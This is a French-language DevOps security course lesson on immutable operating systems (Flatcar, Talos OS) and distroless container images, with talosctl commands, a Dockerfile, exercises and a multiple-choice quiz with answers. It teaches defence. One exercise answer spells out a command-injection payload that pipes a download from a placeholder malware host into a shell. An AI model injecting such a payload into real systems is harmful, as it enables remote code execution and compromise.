# TOME P3 — Cloud Native, DevOps & Cyberdéfense — Jour 113 (6h) : Sécurité des Systèmes d'Exploitation Immuables & Conteneurs Minimalistes (Flatcar Container Linux, Talos OS & Distroless)

> [!NOTE]
> **Objectif du jour :** Concevoir et administrer des infrastructures basées sur des Systèmes d'Exploitation Immuables (Immutable OS) et des conteneurs ultra-minimalistes (Distroless / Scratch) : Flatcar Container Linux, Talos OS pour Kubernetes, suppression de l'accès shell en production, et réduction maximale de la surface d'attaque.
>
> **Compétences visées :** `BIT-09` (A) — OS Immuables & Talos OS | `SEC-03` (A) — Container Hardening & Distroless

---

## 1) Module — Concept d'OS Immuable & Linux Conteneurisés (2h)

### 📖 Narration/Intuition

Sur un système Linux traditionnel (Debian, Ubuntu), un administrateur ou un attaquant compromis peut modifier les fichiers système de `/bin`, `/lib` ou `/etc` à chaud, installer de nouveaux packages via `apt` ou modifier des scripts de démarrage. Cette mutabilité crée des dérives de configuration et permet la persistance des malwares.

Un **Système d'Exploitation Immuable (Immutable OS)** comme **Flatcar Container Linux** ou **Talos OS** verrouille le système de fichiers racine (`/` et `/usr`) en **lecture seule (Read-Only)**. Il est dépourvu de gestionnaire de paquets (`apt`, `yum`), d'interpréteur de commandes (`bash`) et de serveur SSH traditionnel. La seule façon de mettre à jour l'OS est d'appliquer une image complète atomique avec rollback automatique en cas d'échec.

### 🔍 Anatomie Technique

**Comparaison entre OS Mutuel Traditionnel et OS Immuable (Talos / Flatcar) :**

```
┌─────────────────────────────────────────────────────────────┐
│ OS TRADITIONNEL (Debian / RHEL)                             │
│ - Fichiers système modifiables en écriture (/usr, /etc, /bin)│
│ - Gestionnaire de paquets présent (apt, yum, dnf)           │
│ - Shell Bash & accès SSH interactif direct                 │
│ - Risque : Drift de configuration & Persistance Malware     │
└─────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────┐
│ OS IMMUABLE CLOUD-NATIVE (Talos OS / Flatcar)              │
│ - Système de fichiers racine (/) strictly READ-ONLY         │
│ - Aucun gestionnaire de paquets / Aucun shell Bash          │
│ - Administration 100% déclarative via API gRPC chiffrée     │
│ - Mises à jour atomiques A/B (Rollback automatique)         │
└─────────────────────────────────────────────────────────────┘
```

---

## 2) Module — Talos OS : Le Système d'Exploitation Dédié à Kubernetes (2h)

### 📖 Narration/Intuition

**Talos OS** est un système d'exploitation Linux minimaliste conçu exclusivement pour faire tourner Kubernetes. Il n'y a pas de SSH, pas de console Bash, pas de Python ni de paquets standards. Toute l'administration s'effectue de manière sécurisée via un outil CLI (`talosctl`) communiquant en gRPC chiffré avec des certificats TLS avec l'API du nœud.

### 🔍 Anatomie Technique

**Administration d'un nœud Talos OS via `talosctl` :**

```bash
# Installation de l'outil CLI talosctl
curl -sL https://talos.dev/support/talosctl | sh

# 1. Générer la configuration d'un cluster Talos OS de production
talosctl gen config bcc-cluster https://10.0.10.10:6443 --config-dir ./talos-config/

# 2. Appliquer la configuration sur un nœud vierge
talosctl apply-config --nodes 10.0.10.10 --config-file ./talos-config/controlplane.yaml --insecure

# 3. Récupérer le fichier kubeconfig Kubernetes sécurisé via l'API Talos
talosctl kubeconfig --nodes 10.0.10.10 ./kubeconfig

# 4. Inspecter l'état de santé du nœud sans avoir besoin de SSH !
talosctl dashboard --nodes 10.0.10.10
```

---

## 3) Module — Images Conteneurs Distroless & Scratch (2h)

### 📖 Narration/Intuition

Une image de conteneur Docker classique basique (ex: `ubuntu:22.04` ou `python:3.11`) embarque un système d'exploitation complet avec des centaines de binaires inutilement dangereux en production (`bash`, `curl`, `wget`, `apt`, `tar`). Si un attaquant exploite une faille applicative (RCE), il utilise `curl` pour télécharger son malware et `bash` pour exécuter des commandes.

Une **Image Distroless (Google)** contient uniquement votre application et ses dépendances de durée d'exécution directes (ex: le binaire Go ou le runtime Python). Elle ne contient **aucun shell, aucun utilitaire système (`curl`, `ls`, `cat`), ni aucun gestionnaire de paquets**.

### 🔍 Anatomie Technique

**Dockerfile Multi-Stage avec Image de Production Distroless (`Dockerfile.distroless`) :**

```dockerfile
# ─── ÉTAPE 1 : BUILD (Utilise un environnement complet avec outils) ───────────
FROM golang:1.22-alpine AS builder

WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download

COPY . .
# Compilation d'un binaire statique sans dépendances C dynamic
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-w -s" -o /bcc-virement-api .

# ─── ÉTAPE 2 : PRODUCTION (Utilise une image Distroless minimale) ───────────
# gcr.io/distroless/static-debian12 ne contient NI shell, NI package manager
FROM gcr.io/distroless/static-debian12:nonroot

# Copier uniquement le binaire statique depuis l'étape de build
COPY --from=builder /bcc-virement-api /bcc-virement-api

# Exécuter avec un utilisateur non-root (Securité maximale)
USER nonroot:nonroot

EXPOSE 8080
ENTRYPOINT ["/bcc-virement-api"]
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **Immutable OS** | Système d'exploitation en lecture seule empêchant toute modification système à chaud |
| **Distroless** | Image de conteneur minimale ne contenant que l'application et son runtime (sans OS ni shell) |
| **Scratch** | Image Docker vide de 0 octet utilisée pour exécuter des binaires statiques compilés |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Pourquoi l'utilisation d'images de conteneurs **Distroless** réduit-elle considérablement le risque d'exploitation en cas de vulnérabilité applicative de type Remote Code Execution (RCE) ?

**Corrigé :** Lorsqu'un attaquant découvre une vulnérabilité RCE dans une application web, son premier réflexe est d'injecter des commandes shell (ex: `; curl http://malware.com/payload | sh`). Dans un conteneur basé sur une image classique (Ubuntu/Debian), les binaires `sh`, `bash` et `curl` sont présents et exécutent la charge utile de l'attaquant. Dans un conteneur **Distroless**, le système ne contient **aucun interpréteur de commandes (`sh`/`bash`) ni aucun utilitaire réseau (`curl`/`wget`)**. L'injection de commandes échoue instantanément car le système est incapable d'interpréter ou d'exécuter la moindre commande shell.

**Exercice 2 :** Comment met-on à jour le système d'exploitation d'un cluster basé sur **Talos OS** ?

**Corrigé :** Sur Talos OS, il n'existe pas de commande `apt upgrade`. Les mises à jour s'effectuent par **remplacement atomique d'image (A/B Update)** via l'API `talosctl upgrade`. Le système télécharge la nouvelle image système complète dans une partition secondaire, redémarre le nœud sur la nouvelle version et vérifie la santé du nœud. Si le nœud ne répond pas correctement, Talos effectue un **rollback automatique instantané** sur la partition précédente.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel est le principe fondamental d'un système d'exploitation immuable (Immutable OS) comme Talos OS ou Flatcar Container Linux ?
- A) Le système de fichiers racine est verrouillé en lecture seule (Read-Only) et ne peut être modifié à chaud par des commandes d'administration ou des malwares
- B) Il s'efface toutes les 5 minutes
- C) Il nécessite un écran tactile
- D) Il ne supporte pas le réseau

**Réponse : A**

**Q2 :** Quel protocole de communication chiffré par certificats TLS est utilisé par l'outil `talosctl` pour administrer à distance un nœud Talos OS sans nécessiter de serveur SSH ?
- A) gRPC (sur port 50000)
- B) Telnet
- C) FTP
- D) POP3

**Réponse : A**

**Q3 :** Que contient une image de conteneur de type Distroless (ex: `gcr.io/distroless/static-debian12`) ?
- A) Un système d'exploitation complet avec jeux et suite bureautique
- B) Uniquement l'application et ses dépendances de durée d'exécution directes (aucun shell bash, ni utilitaire système)
- C) Uniquement un fichier vidéo
- D) Des virus de démonstration

**Réponse : B**

**Q4 :** Si un conteneur s'exécute sur l'image Docker de base de 0 octet `scratch`, quel type de binaire doit-on obligatoirement y copier pour qu'il puisse s'exécuter ?
- A) Un script Bash
- B) Un binaire statiquement compilé sans dépendances dynamiques C (ex: binaire Go ou Rust)
- C) Un fichier document Word
- D) Un fichier ZIP

**Réponse : B**

**Q5 :** Comment l'immuabilité d'un OS empêche-t-elle la persistance des malwares qui tenteraient de s'installer dans les répertoires système (`/usr` ou `/bin`) ?
- A) Les répertoires système étant montés en Read-Only, toute tentative d'écriture ou de modification par un malware échoue avec une erreur système
- B) En éteignant le processeur
- C) En bloquant le clavier
- D) En modifiant le nom d'hôte

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
